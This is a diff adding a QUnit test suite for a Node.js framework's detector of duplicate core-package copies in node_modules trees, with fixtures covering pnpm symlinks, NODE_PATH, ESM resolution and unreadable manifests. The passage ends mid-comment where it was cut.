@@ -1,0 +1,1015 @@
+/**
+ * Coverage for invariant I1 — "one core" — abofs/stonyx#108.
+ *
+ * The defect: five sibling repos pin `stonyx` EXACTLY in their own
+ * `dependencies`, an exact pin cannot dedupe against a sibling's different
+ * exact pin, and the consumer ends up with several framework singletons only
+ * one of which is ever `start()`ed. Measured from the `stonyx new` scaffold at
+ * `0.2.3-beta.96`: three copies on disk (`0.2.2`, `0.2.3-beta.6`,
+ * `0.2.3-beta.11`).
+ *
+ * Every fixture here installs a REAL second `stonyx` package root under a
+ * module's own `node_modules/`, which is the exact tree shape npm and pnpm
+ * both produce for that manifest. Nothing is stubbed.
+ *
+ * Isolation constraint inherited from `modules-test.ts`: `modulePromises`
+ * (modules.ts:19) is module-level state with no reset, so every test uses a
+ * module name unique to that test.
+ */
+import QUnit from 'qunit';
+import { execFile } from 'node:child_process';
+import { accessSync, chmodSync, constants, existsSync, mkdirSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
+import { dirname, join, resolve } from 'node:path';
+import { fileURLToPath } from 'node:url';
+import { promisify } from 'node:util';
+import loadModules from '../../src/modules.js';
+import { assertDistIsFresh } from '../helpers/dist-freshness.js';
+import {
+  coreSeenBy,
+  duplicateCoreMessage,
+  esmNodeModulesWalk,
+  findForeignCores,
+  owningCore,
+  runningCore,
+  type CorePackage,
+  type ForeignCore,
+} from '../../src/util/duplicate-core.js';
+import { captureConsole, createRoot, installModule, moduleSource, removeRoot, stubChronicle } from '../helpers/module-fixture.js';
+
+const { module, test } = QUnit;
+
+const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), '../..');
+const execFileAsync = promisify(execFile);
+const coreSeenByScript = resolve(dirname(fileURLToPath(import.meta.url)), '../helpers/core-seen-by-plain-node.mjs');
+const esmResolveScript = resolve(dirname(fileURLToPath(import.meta.url)), '../helpers/esm-resolve-stonyx-plain-node.mjs');
+
+/**
+ * Same hard bound as the other subprocess suites in this repo: `execFile` has
+ * no default timeout and this repo sets no `QUnit.config.testTimeout`, so an
+ * unbounded child hangs the run with no TAP.
+ */
+const SUBPROCESS_TIMEOUT_MS = 20_000;
+
+/** Runs `coreSeenBy` in a process STARTED with the given NODE_PATH. */
+async function coreSeenByWithNodePath(moduleDir: string, nodePath: string): Promise<{ version: string } | null> {
+  assertDistIsFresh('coreSeenByWithNodePath');
+
+  const { stdout, stderr } = await execFileAsync('node', [ coreSeenByScript, moduleDir ], {
+    timeout: SUBPROCESS_TIMEOUT_MS,
+    killSignal: 'SIGKILL',
+    env: { ...process.env, NODE_PATH: nodePath },
+  });
+  const marker = stdout.split('__CORE_SEEN_BY__')[1];
+
+  if (!marker) throw new Error(`probe produced no result. stdout: ${stdout}\nstderr: ${stderr}`);
+
+  return JSON.parse(marker) as { version: string } | null;
+}
+
+/**
+ * The core node's OWN ESM resolver reaches from `moduleDir` — the ground truth
+ * `coreSeenBy` exists to model, asked rather than assumed.
+ *
+ * Every claim about the candidate set is a claim about `import.meta.resolve`,
+ * so the tests below anchor to it instead of to a second implementation of the
+ * walk. That is the check the previous form did not have: `isWalkEntry` was
+ * derived from `Module._nodeModulePaths` and asserted to be exact, and it was
+ * exact for CJS and wrong for the resolver `loadModules` actually uses.
+ *
+ * `owningCore` turns the resolved entry FILE into its package root, which is
+ * the unit `coreSeenBy` returns. It is itself guarded, by D15.
+ */
+async function esmResolvedCore(moduleDir: string): Promise<CorePackage | null> {
+  assertDistIsFresh('esmResolvedCore');
+
+  const { stdout, stderr } = await execFileAsync('node', [ esmResolveScript, moduleDir ], {
+    timeout: SUBPROCESS_TIMEOUT_MS,
+    killSignal: 'SIGKILL',
+  });
+  const marker = stdout.split('__ESM_RESOLVE__')[1];
+
+  if (!marker) throw new Error(`esm probe produced no result. stdout: ${stdout}\nstderr: ${stderr}`);
+
+  const resolved = JSON.parse(marker) as string | null;
+
+  return resolved ? owningCore(dirname(fileURLToPath(resolved))) : null;
+}
+
+const roots: string[] = [];
+
+/**
+ * REALPATH'D, and that is load-bearing for D8.
+ *
+ * `mkdtemp(tmpdir())` returns `/var/folders/.../T/...` on macOS while the
+ * directory's real path is `/private/var/folders/.../T/...`. `coreSeenBy`
+ * realpaths the module dir, so any assertion that compares a fixture path
+ * against a resolved one is really comparing `/var` with `/private/var` and
+ * passes or fails on the `/private` prefix rather than on the property under
+ * test. That is exactly how D8 stayed green on macOS while reding on Linux CI,
+ * against correct AND incorrect code. Realpath'ing here makes every fixture in
+ * this file the same shape CI runs on.
+ */
+function root(pkg: Record<string, unknown>): string {
+  const dir = createRoot(pkg, 'stonyx-dupcore-fixture-');
+  roots.push(dir);
+  return realpathSync(dir);
+}
+
+/**
+ * An installed async module. `main.js` WRITES A SENTINEL when it evaluates —
+ * that is how the pre-flight tests tell "threw before importing" from "threw
+ * while importing", which is the whole point of the check being a pre-flight.
+ */
+function installFixtureModule(rootPath: string, name: string, className: string): string {
+  const sentinel = join(rootPath, `${className}.evaluated`);
+
+  installModule(rootPath, name, { main: 'main.js', keywords: [ 'stonyx-module', 'stonyx-async' ]}, {
+    'main.js': `import { writeFileSync } from 'node:fs';\nwriteFileSync(${JSON.stringify(sentinel)}, 'yes');\n${moduleSource(className)}`,
+    'config/environment.js': 'export default {};\n',
+  });
+
+  return sentinel;
+}
+
+/** Installs a SECOND physical `stonyx` package root inside `<module>/node_modules`. */
+function installNestedCore(rootPath: string, moduleName: string, version: string): string {
+  const dir = join(rootPath, 'node_modules', moduleName, 'node_modules', 'stonyx');
+
+  mkdirSync(dir, { recursive: true });
+  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'stonyx', version, type: 'module', main: 'dist/main.js' }));
+
+  return dir;
+}
+
+/**
+ * Installs a second physical `stonyx` package root at
+ * `<app>/node_modules/` + `node_modules/` x `levels` + `/stonyx`.
+ *
+ * `levels: 1` is the shape ESM's PACKAGE_RESOLVE reaches and the CJS walk
+ * skips — the silent miss abofs/stonyx#119 round 2 found. `levels: 2` is off
+ * the ESM walk too, because `<app>/node_modules/node_modules` is not an
+ * ancestor of the module dir; it is here so the bound is asserted rather than
+ * argued.
+ *
+ * Carries a real `main.js`: these fixtures are handed to node's own resolver,
+ * not only read as manifests.
+ */
+function installEsmNestedCore(rootPath: string, version: string, levels = 1): string {
+  const dir = join(rootPath, 'node_modules', ...Array<string>(levels).fill('node_modules'), 'stonyx');
+
+  mkdirSync(dir, { recursive: true });
+  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'stonyx', version, type: 'module', main: 'main.js' }));
+  writeFileSync(join(dir, 'main.js'), 'export default {};\n');
+
+  return dir;
+}
+
+module('[Unit] duplicate-core detector', function(hooks) {
+  hooks.afterEach(function() {
+    while (roots.length) removeRoot(roots.pop()!);
+  });
+
+  // D1 — the negative case, and the control for D2. Without it, D2 proves only
+  // that the detector reports SOMETHING, not that it discriminates.
+  test('D1: reports nothing when a module resolves the running core', function(assert) {
+    const rootPath = root({ name: 'd1-app' });
+    installModule(rootPath, '@stonyx/d1-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+    // The app's own copy of the core IS this repo. A module with no nested copy
+    // walks up to it, exactly as Node would.
+    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
+
+    const core = runningCore();
+    const seen = coreSeenBy(join(rootPath, 'node_modules', '@stonyx/d1-mod'));
+
+    assert.ok(core, 'premise: the running core identifies itself');
+    assert.strictEqual(seen?.root, core?.root, 'the module resolves the same physical package root');
+    assert.deepEqual(
+      findForeignCores([ { name: '@stonyx/d1-mod', dir: join(rootPath, 'node_modules', '@stonyx/d1-mod') } ]),
+      [],
+      'and is not reported'
+    );
+  });
+
+  // D2 — the seeded known-bad. Same fixture as D1 plus one nested package root.
+  test('D2: reports a module whose nested copy is a different physical package root', function(assert) {
+    const rootPath = root({ name: 'd2-app' });
+    installModule(rootPath, '@stonyx/d2-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
+    installNestedCore(rootPath, '@stonyx/d2-mod', '0.0.0-nested');
+
+    const moduleDir = join(rootPath, 'node_modules', '@stonyx/d2-mod');
+    const foreign = findForeignCores([ { name: '@stonyx/d2-mod', dir: moduleDir } ]);
+
+    assert.strictEqual(foreign.length, 1, 'the module is reported');
+    assert.strictEqual(foreign[0]?.moduleCore.version, '0.0.0-nested', 'with the version it actually sees');
+    assert.strictEqual(
+      foreign[0]?.moduleCore.root,
+      join(realpathSync(rootPath), 'node_modules', '@stonyx/d2-mod', 'node_modules', 'stonyx'),
+      'and the absolute path of the copy it would import (symlinks resolved, as node resolves them)'
+    );
+    assert.strictEqual(foreign[0]?.runningCore.root, runningCore()?.root, 'alongside the running core');
+    assert.notStrictEqual(foreign[0]?.moduleCore.root, foreign[0]?.runningCore.root, 'which is a different path');
+  });
+
+  // D7 — the pnpm tree shape, and the control for the realpath narrowing in
+  // `coreSeenBy`. `stonyx new` installs with pnpm (src/cli/new.ts:335), so this
+  // IS the shape the documented procedure produces: every entry under
+  // `node_modules/@stonyx/` is a symlink into the store, and Node resolves that
+  // symlink BEFORE resolving the module's own imports.
+  //
+  // Without the realpath, the walk reads the app's flat `node_modules`, finds
+  // the app's own core, and reports nothing — the check passes vacuously on
+  // exactly the installer that produces the defect. Measured: with
+  // `realPath(moduleDir)` replaced by `moduleDir`, D1-D6 all stay GREEN and
+  // only this test reds.
+  test('D7: resolves through a pnpm store symlink, not through the flat link path', function(assert) {
+    const rootPath = root({ name: 'd7-app' });
+    const store = join(rootPath, 'node_modules', '.pnpm', '@stonyx+d7-mod@1.0.0', 'node_modules');
+
+    mkdirSync(join(store, '@stonyx', 'd7-mod'), { recursive: true });
+    writeFileSync(
+      join(store, '@stonyx', 'd7-mod', 'package.json'),
+      JSON.stringify({ name: '@stonyx/d7-mod', version: '1.0.0', type: 'module', main: 'main.js', keywords: [ 'stonyx-module' ]})
+    );
+    mkdirSync(join(store, 'stonyx'), { recursive: true });
+    writeFileSync(
+      join(store, 'stonyx', 'package.json'),
+      JSON.stringify({ name: 'stonyx', version: '0.0.0-pnpm-nested', type: 'module', main: 'dist/main.js' })
+    );
+
+    // The app's flat view: both entries are symlinks, exactly as pnpm writes them.
+    mkdirSync(join(rootPath, 'node_modules', '@stonyx'), { recursive: true });
+    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
+    symlinkSync(join(store, '@stonyx', 'd7-mod'), join(rootPath, 'node_modules', '@stonyx', 'd7-mod'), 'dir');
+
+    const linkPath = join(rootPath, 'node_modules', '@stonyx', 'd7-mod');
+
+    assert.notStrictEqual(realpathSync(linkPath), linkPath, 'premise: the module entry really is a symlink');
+    assert.strictEqual(
+      coreSeenBy(linkPath)?.version,
+      '0.0.0-pnpm-nested',
+      'the core is resolved from the store location, which is where node resolves it from'
+    );
+    assert.strictEqual(
+      findForeignCores([ { name: '@stonyx/d7-mod', dir: linkPath } ]).length,
+      1,
+      'and the module is reported'
+    );
+  });
+
+  // D3 — FAIL DIRECTION. The guard converts a silent wrong state into a loud
+  // one; it must not invent a boot failure out of an inconclusive probe.
+  test('D3: fails open — a module that cannot resolve stonyx at all is not reported', function(assert) {
+    const rootPath = root({ name: 'd3-app' });
+    installModule(rootPath, '@stonyx/d3-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+    const moduleDir = join(rootPath, 'node_modules', '@stonyx/d3-mod');
+
+    assert.strictEqual(coreSeenBy(moduleDir), null, 'no core is reachable from the module');
+    assert.deepEqual(findForeignCores([ { name: '@stonyx/d3-mod', dir: moduleDir } ]), [], 'and nothing is reported');
+    assert.deepEqual(
+      findForeignCores([ { name: '@stonyx/d3-mod', dir: moduleDir } ], null),
+      [],
+      'nor when the running core cannot identify itself either'
+    );
+  });
+
+  // D8 — CONTROL for the candidate set in `coreSeenBy` (`esmNodeModulesWalk`).
+  // The candidates used to come from `require.resolve.paths`, which appends the
+  // CJS global folders (NODE_PATH, ~/.node_modules, the node prefix) after the
+  // node_modules walk. ESM ignores all of them, so honouring them invents a
+  // "duplicate core" out of an environment variable that the real import never
+  // consults — turning a boot that works into a refusal.
+  //
+  // The walk is now GENERATED rather than filtered, so there is no list
+  // carrying those entries and nothing reads the environment. This test is the
+  // regression guard on that: it must stay green for a reason, and the reason
+  // must not quietly become "the filter happens to reject them again".
+  //
+  // Must run in a subprocess: NODE_PATH is read once at bootstrap into
+  // `Module.globalPaths`, so setting `process.env.NODE_PATH` from a test is a
+  // check that cannot fail.
+  //
+  // WHAT THIS ASSERTS, AND WHY IT CHANGED. The previous version handed the
+  // child a `/var/folders/...` NODE_PATH while the module dir realpath'd to
+  // `/private/var/folders/...`, so the old prefix test missed on `/private`
+  // rather than on non-ancestry: it was green on macOS against BOTH the correct
+  // and the broken filter, and red on Linux against both. It measured the host,
+  // not the invariant. Every path here is realpath-clean (see `root`), and the
+  // two contaminated cases are the two shapes that matter:
+  //
+  //   SHALLOW — the store sits beside the app under a shared parent. This is
+  //     the ordinary temp-dir and sibling-checkout shape, and the one CI hit.
+  //   DEEP    — the store sits INSIDE the app (`<app>/tools`), so its parent is
+  //     a genuine ancestor of the module dir. A filter that only rejected
+  //     shallow entries would still admit this one.
+  //
+  // Neither directory is named `node_modules`, so neither is anything node's
+  // walk would ever emit, and both must be ignored.
+  test('D8: a stonyx reachable only via NODE_PATH is ignored, shallow or deep', async function(assert) {
+    const rootPath = root({ name: 'd8-app' });
+    installModule(rootPath, '@stonyx/d8-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
+
+    // The ambient store. `<contaminated>/stonyx` is what NODE_PATH points at;
+    // `<contaminated>/node_modules/stonyx` is the SAME manifest reachable by a
+    // genuine walk, and exists only so this fixture's liveness is provable.
+    const contaminated = root({ name: 'd8-nodepath-store' });
+    const ambientManifest = JSON.stringify({ name: 'stonyx', version: '0.0.0-ambient', type: 'module', main: 'dist/main.js' });
+
+    for (const dir of [ join(contaminated, 'stonyx'), join(contaminated, 'node_modules', 'stonyx') ]) {
+      mkdirSync(dir, { recursive: true });
+      writeFileSync(join(dir, 'package.json'), ambientManifest);
+    }
+
+    installModule(contaminated, '@stonyx/d8-liveness', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+
+    // A module with NO reachable core is where a global folder would win, and
+    // it is the only place the filter is observable at all.
+    const isolated = root({ name: 'd8-isolated-app' });
+    installModule(isolated, '@stonyx/d8-isolated', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+
+    const isolatedModuleDir = join(isolated, 'node_modules', '@stonyx/d8-isolated');
+    const deepStore = join(isolated, 'tools');
+
+    mkdirSync(join(deepStore, 'stonyx'), { recursive: true });
+    writeFileSync(join(deepStore, 'stonyx', 'package.json'), ambientManifest);
+
+    assert.strictEqual(realpathSync(isolated), isolated, 'premise: the fixture root is realpath-clean, so nothing here can pass on a /private prefix');
+
+    // LIVENESS of the ambient fixture itself: reached by a real walk it IS
+    // reported. So a null below is the filter rejecting the candidate, not an
+    // unreadable or absent manifest.
+    assert.strictEqual(
+      (await coreSeenByWithNodePath(join(contaminated, 'node_modules', '@stonyx/d8-liveness'), contaminated))?.version,
+      '0.0.0-ambient',
+      'liveness: the ambient core IS resolvable when it sits on the module\'s own walk'
+    );
+    assert.strictEqual(
+      (await coreSeenByWithNodePath(join(rootPath, 'node_modules', '@stonyx/d8-mod'), contaminated))?.version,
+      runningCore()?.version,
+      'premise: with a real core in the tree, that is what is reported'
+    );
+    assert.strictEqual(
+      await coreSeenByWithNodePath(isolatedModuleDir, contaminated),
+      null,
+      'SHALLOW: a NODE_PATH store beside the app, under a shared parent, is not reported'
+    );
+    assert.strictEqual(
+      await coreSeenByWithNodePath(isolatedModuleDir, deepStore),
+      null,
+      'DEEP: a NODE_PATH store INSIDE the app, whose parent is a genuine ancestor, is not reported either'
+    );
+
+    // The NESTED case that used to live here asserted that a core at
+    // `<app>/node_modules/node_modules` must be IGNORED, on the premise that
+    // "node's walk never descends into a directory already named
+    // `node_modules`". That premise is true of CJS and FALSE of ESM, which is
+    // the resolver this whole file models — so the assertion pinned the wrong
+    // direction and defended a silent miss. It is not deleted, it is INVERTED
+    // and moved to D17/D18/D19, where it is anchored to what
+    // `import.meta.resolve` actually returns rather than to a claim about the
+    // algorithm. Nothing about that shape belongs in a NODE_PATH test: it is
+    // reached with no NODE_PATH at all.
+  });
+
+  // D17, D18, D19 — the candidate set IS the ESM walk, in all three directions.
+  //
+  // What they replace. `isWalkEntry` derived the candidates from
+  // `require.resolve.paths` and filtered them by the CJS walk's shape, on a
+  // premise stated as EXACT: "node never descends into a directory already
+  // named `node_modules`". True of `Module._nodeModulePaths`. False of ESM's
+  // PACKAGE_RESOLVE, which has no such skip — and ESM is what `loadModules`
+  // uses. Measured from a module dir with NO `NODE_PATH` at all:
+  //
+  //   import.meta.resolve('stonyx') -> <app>/node_modules/node_modules/stonyx/main.js
+  //   await import('stonyx')        -> that copy
+  //   require.resolve('stonyx')     -> MODULE_NOT_FOUND
+  //
+  // So these three ANCHOR TO NODE rather than to a second implementation of the
+  // walk. `esmResolvedCore` runs `import.meta.resolve` in a plain subprocess
+  // from inside the fixture and reports the package root it lands on; every
+  // assertion about the candidate set is checked against that. A rewrite of
+  // `esmNodeModulesWalk` that is wrong in the same way the last one was cannot
+  // agree with it.
+
+  // D17 — THE MISS. A genuine second core one level nested, nothing else in the
+  // tree. The isolating control is D2: the same manifest one directory over, at
+  // `<module>/node_modules/stonyx`, is reported by both resolvers and by the
+  // old code. The only variable here is the directory.
+  test('D17: a second core at <app>/node_modules/node_modules is on the ESM walk and IS reported', async function(assert) {
+    const rootPath = root({ name: 'd17-app' });
+    installModule(rootPath, '@stonyx/d17-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+
+    const moduleDir = join(rootPath, 'node_modules', '@stonyx/d17-mod');
+
+    // CONTROL, before the copy exists: nothing to find, nothing reported. So a
+    // report below is the nested core and not an inert fixture.
+    assert.strictEqual(coreSeenBy(moduleDir), null, 'control: with no copy anywhere on the walk, nothing is found');
+
+    const nested = installEsmNestedCore(rootPath, '0.0.0-esm-nested');
+
+    assert.strictEqual(
+      (await esmResolvedCore(moduleDir))?.root,
+      nested,
+      'premise: node\'s own ESM resolver reaches this copy — the CJS walk cannot see it at all'
+    );
+    assert.strictEqual(coreSeenBy(moduleDir)?.root, nested, 'and coreSeenBy reports the same physical root node would import');
+    assert.strictEqual(coreSeenBy(moduleDir)?.version, '0.0.0-esm-nested', 'with the version it actually sees');
+    assert.strictEqual(
+      findForeignCores([ { name: '@stonyx/d17-mod', dir: moduleDir } ]).length,
+      1,
+      'so the module is reported rather than silently missed'
+    );
+  });
+
+  // D18 — THE SHADOWING CASE, and the strongest form. The app has a CORRECT
+  // local core. ESM reaches the ancestor `<app>/node_modules` before `<app>`,
+  // so the nested copy wins over the correct one — the module loads, it
+  // initialises, it reports success and its hooks never fire, which is the
+  // opening paragraph of `duplicate-core.ts` surviving the check written to
+  // catch it. This is also the ORDER guard: a walk generated root-first instead
+  // of self-first finds the correct core and reports nothing.
+  test('D18: a nested core SHADOWS a correct local core, and the shadowing is refused', async function(assert) {
+    const rootPath = root({ name: 'd18-app' });
+    installModule(rootPath, '@stonyx/d18-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
+
+    const moduleDir = join(rootPath, 'node_modules', '@stonyx/d18-mod');
+    const modules = [ { name: '@stonyx/d18-mod', dir: moduleDir } ];
+
+    // CONTROL, same tree minus the nested copy: a genuinely single-core app.
+    assert.strictEqual((await esmResolvedCore(moduleDir))?.root, runningCore()?.root, 'control: node resolves the correct local core');
+    assert.strictEqual(coreSeenBy(moduleDir)?.root, runningCore()?.root, 'control: and so does coreSeenBy');
+    assert.deepEqual(findForeignCores(modules), [], 'control: nothing is reported');
+
+    const nested = installEsmNestedCore(rootPath, '0.0.0-esm-shadow');
+
+    assert.strictEqual(
+      (await esmResolvedCore(moduleDir))?.root,
+      nested,
+      'premise: adding the nested copy makes node import IT, not the correct core beside it'
+    );
+    assert.strictEqual(coreSeenBy(moduleDir)?.root, nested, 'coreSeenBy reports the copy that actually wins, in node\'s order');
+    assert.strictEqual(findForeignCores(modules).length, 1, 'and the shadowed boot is refused');
+  });
+
+  // D19 — THE BOUND, i.e. the direction that would brick a working consumer.
+  // The candidate set must not over-admit either: `<app>/node_modules` is an
+  // ancestor of the module dir so its `node_modules` is on the walk, but
+  // `<app>/node_modules/node_modules` is NOT an ancestor, so two levels is off
+  // it. The bound falls out of ancestry rather than out of a rule, and this
+  // asserts that rather than arguing it.
+  test('D19: the ESM walk is bounded by ancestry — a core two levels nested is correctly ignored', async function(assert) {
+    const rootPath = root({ name: 'd19-app' });
+    installModule(rootPath, '@stonyx/d19-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
+
+    const moduleDir = join(rootPath, 'node_modules', '@stonyx/d19-mod');
+    const modules = [ { name: '@stonyx/d19-mod', dir: moduleDir } ];
+
+    // LIVENESS: the SAME manifest at ONE level is reported. So the null result
+    // below is the depth and not an unreadable or misspelt fixture.
+    const oneLevel = installEsmNestedCore(rootPath, '0.0.0-depth-probe', 1);
+
+    assert.strictEqual(coreSeenBy(moduleDir)?.root, oneLevel, 'liveness: at one level this exact fixture IS reported');
+
+    rmSync(join(rootPath, 'node_modules', 'node_modules'), { recursive: true, force: true });
+
+    const twoLevels = installEsmNestedCore(rootPath, '0.0.0-depth-probe', 2);
+
+    assert.ok(existsSync(join(twoLevels, 'package.json')), 'premise: the two-level copy is really on disk');
+    assert.strictEqual(
+      (await esmResolvedCore(moduleDir))?.root,
+      runningCore()?.root,
+      'premise: node itself does not reach two levels — it resolves the correct core'
+    );
+    assert.strictEqual(coreSeenBy(moduleDir)?.root, runningCore()?.root, 'and neither does coreSeenBy');
+    assert.deepEqual(findForeignCores(modules), [], 'so a single-core app is not refused over a directory node never consults');
+  });
+
+  // D21 — the exported walk's OWN output, asserted lexically and in full.
+  //
+  // D17/D18/D19 reach `esmNodeModulesWalk` only through `coreSeenBy`, and they
+  // reach it only where a fixture is planted. That leaves the last clause of
+  // the generator unguarded: DROPPING THE ROOT EMISSION — returning before
+  // `join(dir, 'node_modules')` for the filesystem root — passes all 178 of
+  // them, because no test plants a core at `/node_modules` and none can, since
+  // that needs a write to `/`.
+  //
+  // So the guard is lexical rather than behavioural: it asserts the SEQUENCE
+  // the function returns, which is checkable for the root candidate without
+  // creating it. Node v24.13.0 does stat `/node_modules/stonyx` before
+  // terminating — `getPackageJSONURL` exits on the length equality that the
+  // root iteration produces, after that probe, not before it — so the emission
+  // is Node's behaviour and this pins it rather than proposing it.
+  //
+  // Pure path arithmetic: `esmNodeModulesWalk` touches no filesystem, so a
+  // synthetic `fromDir` gives an expectation that does not move with the depth
+  // of the temp directory. This one is the shape the whole cluster is about —
+  // a scoped module inside an app's `node_modules` — so the sequence also
+  // carries the no-skip property D17 covers behaviourally (`.../node_modules/
+  // @stonyx/node_modules` and `<app>/node_modules/node_modules` are both
+  // present, and the CJS walk emits neither).
+  test('D21: the walk emits <d>/node_modules for every ancestor-or-self d, root included, in order', function(assert) {
+    assert.deepEqual(
+      esmNodeModulesWalk('/app/node_modules/@stonyx/d21-mod'),
+      [
+        '/app/node_modules/@stonyx/d21-mod/node_modules',
+        '/app/node_modules/@stonyx/node_modules',
+        '/app/node_modules/node_modules',
+        '/app/node_modules',
+        '/node_modules',
+      ],
+      'ancestor-or-self, self first, no skip over node_modules, terminating with the filesystem root'
+    );
+
+    // The root emission alone, stated separately so a failure names it: from
+    // `/` the walk is exactly one entry, and a generator that returns before
+    // emitting at the root returns none.
+    assert.deepEqual(esmNodeModulesWalk('/'), [ '/node_modules' ], 'and the filesystem root itself emits its own candidate');
+  });
+
+  // D10 — the fail-opens are SILENT, which is the half of the disclosure that
+  // was never pinned. The fail DIRECTION is deliberate and stays: this guard
+  // converts a silent wrong state into a loud one and must not invent a boot
+  // failure out of an inconclusive probe. But all three sites were measured
+  // reachable, and each let a tree carrying a genuine second core boot clean
+  // and quiet while the control threw in the same run — so "we could not check"
+  // was indistinguishable from "we checked and it is fine".
+  //
+  // D3 pins the direction for two arms. This pins the SIGNAL, and covers the
+  // arm nothing covered: a nested manifest that exists and will not read.
+  test('D10: a nested manifest that exists but will not read fails open AND says so', function(assert) {
+    const rootPath = root({ name: 'd10-app' });
+    installModule(rootPath, '@stonyx/d10-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
+
+    const moduleDir = join(rootPath, 'node_modules', '@stonyx/d10-mod');
+    const nested = installNestedCore(rootPath, '@stonyx/d10-mod', '0.0.0-nested');
+    const nestedManifest = join(nested, 'package.json');
+    const probe = (): { foreign: ForeignCore[]; reports: string[] } => {
+      const reports: string[] = [];
+      const foreign = findForeignCores([ { name: '@stonyx/d10-mod', dir: moduleDir } ], undefined, message => reports.push(message));
+
+      return { foreign, reports };
+    };
+
+    // CONTROL, same fixture, readable manifest: the second core IS reported and
+    // nothing is written. So a silent [] below is the fail-open, not an inert
+    // harness.
+    const control = probe();
+
+    assert.strictEqual(control.foreign.length, 1, 'control: with a readable manifest the second core is reported');
+    assert.deepEqual(control.reports, [], 'control: and nothing is reported as inconclusive');
+
+    writeFileSync(nestedManifest, '{ this is not json');
+
+    const corrupt = probe();
+
+    assert.deepEqual(corrupt.foreign, [], 'an unparseable nested manifest fails OPEN — no invented boot failure');
+    assert.strictEqual(corrupt.reports.length, 1, 'and is reported exactly once');
+    assert.ok(corrupt.reports[0]?.includes(nestedManifest), `naming the file it could not read, got: ${corrupt.reports[0]}`);
+    assert.ok(corrupt.reports[0]?.includes('SyntaxError'), 'and why');
+
+    writeFileSync(nestedManifest, JSON.stringify({ name: 'stonyx', version: '0.0.0-nested' }));
+    chmodSync(nestedManifest, 0o000);
+
+    let unreadable = true;
+
+    // Running as root defeats the mode bits entirely; assert the premise rather
+    // than assert nothing.
+    try {
+      accessSync(nestedManifest, constants.R_OK);
+      unreadable = false;
+    } catch { /* expected */ }
+
+    if (unreadable) {
+      const denied = probe();
+
+      assert.deepEqual(denied.foreign, [], 'a chmod 000 nested manifest also fails OPEN');
+      assert.strictEqual(denied.reports.length, 1, 'and is reported');
+      assert.ok(denied.reports[0]?.includes('EACCES'), `naming the reason, got: ${denied.reports[0]}`);
+    } else {
+      assert.ok(true, 'premise absent: this process can read a chmod 000 file, so the EACCES arm is not observable here');
+      assert.ok(true, '');
+      assert.ok(true, '');
+    }
+
+    chmodSync(nestedManifest, 0o644);
+  });
+
+  // D11 — the second fail-open site, and the widest: no running core means no
+  // comparison and nothing checked at all. `owningCore` returning null is
+  // reachable in production by interposing a `package.json` above `dist/`,
+  // measured to boot a two-core tree clean and silent.
+  test('D11: an unidentifiable running core fails open AND says so', function(assert) {
+    const rootPath = root({ name: 'd11-app' });
+    installModule(rootPath, '@stonyx/d11-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
+    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
+    installNestedCore(rootPath, '@stonyx/d11-mod', '0.0.0-nested');
+
+    const modules = [ { name: '@stonyx/d11-mod', dir: join(rootPath, 'node_modules', '@stonyx/d11-mod') } ];
+    const reports: string[] = [];
+
+    // CONTROL first: with a running core this exact tree IS reported.
+    assert.strictEqual(findForeignCores(modules, undefined, message => reports.push(message)).length, 1, 'control: the second core is reported when the running core is known');
+    assert.deepEqual(reports, [], 'control: and nothing is inconclusive');
+
+    const blind: string[] = [];
+
+    assert.deepEqual(findForeignCores(modules, null, message => blind.push(message)), [], 'with no running core nothing is reported as foreign');
+    assert.strictEqual(blind.length, 1, 'but the skipped pre-flight is announced');
+    assert.ok(blind[0]?.includes('could not identify itself'), `naming what went wrong, got: ${blind[0]}`);
+  });
+
+  // D15 — `owningCore` stops at the FIRST `package.json`, not the first one
+  // named `stonyx`. Its docblock argues at length that this is load-bearing:
+  // continuing past it walks out of the resolved package, and inside this
+  // repo's own worktree the next ancestor with a manifest IS named `stonyx`,
+  // which would make every fixture look like a match.
+  //
+  // That argument had no test. A mutant that walked past a non-stonyx manifest
+  // survived the entire suite — the same shape PC-D and PC-E had before the
+  // previous round, and the reason `owningCore` is exported at all.
+  test('D15: the owner walk stops at the first package.json, not the first stonyx one', function(assert) {
+    const base = root({ name: 'stonyx', version: '0.0.0-owner' });
+    const intruder = join(base, 'vendor');
+    const deeper = join(intruder, 'lib', 'nested');
+    const plain = join(base, 'plain', 'nested');
+
+    mkdirSync(deeper, { recursive: true });
+    mkdirSync(plain, { recursive: true });
+    writeFileSync(join(intruder, 'package.json'), JSON.stringify({ name: 'not-stonyx', version: '1.2.3' }));
+
+    // CONTROL: with no manifest in the way the walk DOES reach the stonyx root,
+    // so a null below is the stop, not a walk that never ascends.
+    assert.strictEqual(owningCore(plain)?.root, base, 'control: the walk ascends to the owning stonyx package when nothing intervenes');
+    assert.strictEqual(owningCore(base)?.version, '0.0.0-owner', 'control: and identifies it by its own manifest');
+    assert.strictEqual(
+      owningCore(deeper),
+      null,
+      'a non-stonyx package.json between the start and the stonyx root ends the walk — it does not report the ancestor'
+    );
+  });
+
+  // D16 — `asCore`'s `'unknown'` version fallback. A nested core whose manifest
+  // omits `version` is malformed, not absent: dropping the whole core because
+  // one field is missing would silently un-detect a real duplicate, which is
